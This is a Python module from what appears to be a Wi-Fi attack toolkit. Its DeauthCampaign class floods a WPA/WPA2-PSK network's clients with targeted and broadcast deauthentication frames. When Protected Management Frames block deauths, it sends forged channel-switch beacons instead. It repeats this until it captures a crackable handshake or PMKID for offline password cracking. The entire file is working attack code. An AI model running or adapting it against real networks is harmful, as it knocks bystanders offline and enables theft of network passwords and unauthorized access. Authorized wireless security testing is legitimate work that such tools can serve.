"""Deauth campaign: provoke a WPA/WPA2-PSK re-handshake for the always-on capture.

Round-robins each associated client with a two-way deauth burst, then a broadcast
deauth, then a CSA beacon burst each round, until the passive capture records a NEW
crackable handshake (or the user stops). PMF-required targets ignore deauths: CSA only.
It needs no fake MAC and no association: a channel-only lease for TX, and the sink for
the stop condition. The always-on
capture fills ``ap.handshakes``; deauth only kicks clients into re-handshaking.
"""
from __future__ import annotations

import asyncio
import logging
from typing import Optional

from wifit3.campaigns.eviltwin.campaign import csa_target_channel
from wifit3.crack.handshake import PSK_CAPTURE_AKMS, crackable_pairs, pmkid_crackable
from wifit3.dot11.csa import build_csa_beacon
from wifit3.dot11.pmf import PmfPosture
from wifit3.models import AccessPoint

from . import treelog
from .campaign import Campaign

logger = logging.getLogger(__name__)

BURST_ROUNDS = 10        # deauth_client rounds per client per pass (matches the one-shot X)
BCAST_COUNT = 20         # broadcast-deauth frames at the end of each round
SETTLE_SEC = 6.0         # wait after a burst for the provoked handshake to land
CSA_COUNT = 16           # CSA beacons per burst
CSA_GAP_SEC = 0.104      # ~one beacon interval (100 TU) between CSA beacons


class DeauthCampaign(Campaign):
    """Deauth / CSA a WPA/WPA2-PSK target's clients until the capture records a new handshake."""

    button_id = "btn-deauth"
    key = "deauth"
    hotkey = ("D", "AutoDeauth")
    idle_label = "AutoDeauth"
    run_label = "Stop Deauth"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap: AccessPoint) -> bool:
        """WPA/WPA2-PSK only: a PSK-family AKM must be confirmed. Hides WEP/open/SAE-only/unconfirmed."""
        return bool(PSK_CAPTURE_AKMS & set(ap.akm_suites))

    @classmethod
    def ineligible_reason(cls, ap: AccessPoint) -> Optional[str]:
        if (ap.pmf_posture in (PmfPosture.REQUIRED, PmfPosture.INVALID)
                and not ap.last_beacon_frame):
            return "PMF required or invalid: CSA needs a captured beacon"
        return None

    def status_under_card(self) -> str:
        return "● Deauth"

    def status_headlines(self, vault) -> list[str]:
        return ["[bold cyan]● Deauth[/bold cyan] forcing a re-handshake",
                f"[dim]client acks:{self.client_acks}/{self.client_sent} · "
                f"bcast:{self.bcast_sent} · csa:{self.csa_sent}[/dim]"]

    def __init__(self, array, target, log=None):
        super().__init__(ap=target, array=array)
        self.target = target
        self.log = log or (lambda _m: None)
        self.client_acks = 0
        self.client_sent = 0
        self.bcast_sent = 0
        self.csa_sent = 0
        self.captured = False
        self._baseline = 0

    def _crackable_count(self) -> int:
        """How many crackable handshakes (4-way pairs + plain-PSK PMKIDs) the sink holds."""
        ap = self.array.access_points.get(self.target.bssid.lower())
        if ap is None:
            return 0
        total = 0
        for hs in ap.handshakes.values():
            total += len(crackable_pairs(hs))
            if hs.pmkid and pmkid_crackable(hs):
                total += 1
        return total

    def _new_capture(self) -> bool:
        """A crackable handshake landed since we started (baseline guards a pre-existing one)."""
        return self._crackable_count() > self._baseline

    def _target_clients(self) -> list[str]:
        target = self.target.bssid.lower()
        own = self.array.forged_macs
        return [mac for mac, c in self.array.clients.items()
                if (c.bssid or "").lower() == target and mac not in own]

    def _csa_frame(self) -> Optional[bytes]:
        beacon = getattr(self.target, "last_beacon_frame", None)
        if not beacon:
            return None
        channel = self.target.channel
        return build_csa_beacon(beacon, csa_target_channel(channel), from_channel=channel)

    async def _send_csa_burst(self, iface, frame: bytes) -> None:
        for _ in range(CSA_COUNT):
            if self.stopped:
                return
            await iface.send_no_wait(frame)
            self.csa_sent += 1
            await asyncio.sleep(CSA_GAP_SEC)

    async def _settle(self) -> None:
        await self.array.wait_until(lambda: self._new_capture() or self.stopped, SETTLE_SEC)

    async def _loop(self) -> None:
        self._baseline = self._crackable_count()
        deauth_allowed = self.target.pmf_posture in (PmfPosture.DISABLED, PmfPosture.OPTIONAL)
        csa = self._csa_frame()
        if not deauth_allowed and csa is None:
            self.log(treelog.leaf("PMF required or invalid and no beacon captured: nothing to send"))
            return
        if not deauth_allowed:
            self.log(treelog.leaf("PMF required or invalid: CSA only"))
        else:
            self.log(treelog.leaf(f"targeting {len(self._target_clients())} client(s) + broadcast"))
        async with self.array.lease(channel=self.target.channel, iface=self.iface) as iface:
            while not self.stopped and not self._new_capture():
                if deauth_allowed:
                    for mac in self._target_clients():
                        if self.stopped or self._new_capture():
                            break
                        self.log(f"Deauthing client [cyan]{mac}[/cyan]…")
                        res = await iface.deauth_client(self.target.bssid, mac, rounds=BURST_ROUNDS)
                        self.client_sent += res.total_sent
                        self.client_acks += res.total_acked
                        await self._settle()
                    if self.stopped or self._new_capture():
                        break
                    self.log("Deauthing [cyan]broadcast[/cyan]…")
                    self.bcast_sent += await iface.deauth_broadcast(self.target.bssid,
                                                                    count=BCAST_COUNT)
                    await self._settle()
                if self.stopped or self._new_capture() or csa is None:
                    continue
                self.log("Sending [cyan]CSA[/cyan] beacons…")
                await self._send_csa_burst(iface, csa)
                await self._settle()
        self.captured = self._new_capture()
